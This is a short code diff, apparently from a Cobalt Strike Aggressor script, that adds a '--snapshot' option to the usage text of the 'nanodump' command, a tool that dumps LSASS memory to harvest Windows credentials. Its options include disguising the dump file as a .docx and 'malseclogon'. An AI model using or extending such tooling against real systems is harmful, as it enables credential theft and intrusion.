@@ -38,7 +38,7 @@ local('$string $c');
 beacon_command_register(
 "nanodump",
 "Use syscalls to dump LSASS.",
-"Usage: nanodump [--getpid] [--write C:\\Windows\\Temp\\doc.docx] [--valid] [--fork] [--dup] [--malseclogon] [--binary C:\\Windows\\notepad.exe]");
+"Usage: nanodump [--getpid] [--write C:\\Windows\\Temp\\doc.docx] [--valid] [--fork] [--snapshot] [--dup] [--malseclogon] [--binary C:\\Windows\\notepad.exe]");
 alias nanodump {
     local('$barch $handle $bof $exe $args $pid $cname $dump_path $write_file $use_valid_sig $fork $snapshot $dup $i $get_pid $use_malseclogon $folder $nanodump_binary');
 
